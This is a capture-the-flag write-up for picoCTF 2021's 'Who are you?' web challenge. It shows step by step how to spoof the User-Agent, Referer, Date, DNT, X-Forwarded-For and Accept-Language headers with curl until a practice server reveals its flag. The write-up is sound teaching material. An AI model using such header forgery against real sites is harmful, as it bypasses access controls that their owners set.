# Who are you?

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 100
Tags: picoCTF 2021, Web Exploitation
Author: MADSTACKS
 
Description:
Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn 

http://mercury.picoctf.net:38322/

Hints:
1. It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616
```

## Solution

Browsing to the website displays the message `Only people who use the official PicoBrowser are allowed on this site!`.  

### Changing the User-agent header

We have the wrong [user-agent header](https://en.wikipedia.org/wiki/User-Agent_header). See [section 14.43 User-Agent](https://datatracker.ietf.org/doc/html/rfc2616#section-14.43) in the RFC.

The user-agent is easiest changed with `curl`
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Who_are_you]
└─$  curl -s -A PicoBrowser http://mercury.picoctf.net:38322/ | grep h3                         
                                <h3 style="color:red">I don&#39;t trust users visiting from another site.</h3>         
```

### Changing the Referer header

Hhm, we need to make it look as if we came from the same site. That is, change the [referer header](https://en.wikipedia.org/wiki/HTTP_referer). See [section 14.36 Referer](https://datatracker.ietf.org/doc/html/rfc2616#section-14.36) in the RFC.

Again, we use `curl` for this
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Who_are_you]
└─$ curl -s -A PicoBrowser -e http://mercury.picoctf.net:38322/ http://mercury.picoctf.net:38322/ | grep h3
                                <h3 style="color:red">Sorry, this site only worked in 2018.</h3>  
```

Still not there! 

### Changing the Date header

We also need to change the Date header. See [section 14.18 Date](https://datatracker.ietf.org/doc/html/rfc2616#section-14.18) in the RFC.

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Who_are_you]
└─$ curl -s -A PicoBrowser -e http://mercury.picoctf.net:38322/ -H "Date: Mon, 1 Apr 2018 00:00:00 GMT" http://mercury.picoctf.net:38322/ | grep h3
                                <h3 style="color:red">I don&#39;t trust users who can be tracked.</h3>
```

### Changing the DNT header

OK, we also need to change the [Do Not Track (DNT) header](https://en.wikipedia.org/wiki/Do_Not_Track).

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Who_are_you]
└─$ curl -s -A PicoBrowser -e http://mercury.picoctf.net:38322/ -H "Date: Mon, 1 Apr 2018 00:00:00 GMT" -H "DNT: 1" http://mercury.picoctf.net:38322/ | grep h3
                                <h3 style="color:red">This website is only for people from Sweden.</h3>
```

More work to do...

### Changing the XFF header

Hhm, we need to change the [X-Forwarded-For (XFF) header](https://en.wikipedia.org/wiki/X-Forwarded-For) as well.  
For that we need a random [IP address in Sweden](https://www.nirsoft.net/countryip/se.html) such as `213.89.89.89`.

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Who_are_you]
└─$ curl -s -A PicoBrowser -e http://mercury.picoctf.net:38322/ -H "Date: Mon, 1 Apr 2018 00:00:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 213.89.89.89" http://mercury.picoctf.net:38322/ | grep h3
                                <h3 style="color:red">You&#39;re in Sweden but you don&#39;t speak Swedish?</h3>
```

Still not there!

### Changing the Accept-Language header

We also need to change the Accept-Language header to be `sv`. See [section 14.4 Accept-Language](https://datatracker.ietf.org/doc/html/rfc2616#section-14.4) in the RFC.  

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Web_Exploitation/Who_are_you]
└─$ curl -s -A PicoBrowser -e http://mercury.picoctf.net:38322/ -H "Date: Mon, 1 Apr 2018 00:00:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 213.89.89.89" -H "Accept-Language: sv" http://mercury.picoctf.net:38322/ | grep h3
                                <h3 style="color:green">What can I say except, you are welcome</h3>
                        <b>picoCTF{<REDACTED>}</b>
```

And there, finally, we have the flag.

For additional information, please see the references below.

## References

- [RFC 2616 - HTTP 1.1](https://datatracker.ietf.org/doc/html/rfc2616)
- [curl(1) - Linux man page](https://linux.die.net/man/1/curl)
- [Wikipedia - User-Agent header](https://en.wikipedia.org/wiki/User-Agent_header)
- [Wikipedia - HTTP referer](https://en.wikipedia.org/wiki/HTTP_referer)
- [Wikipedia - Do Not Track](https://en.wikipedia.org/wiki/Do_Not_Track)
- [Wikipedia - X-Forwarded-For](https://en.wikipedia.org/wiki/X-Forwarded-For)
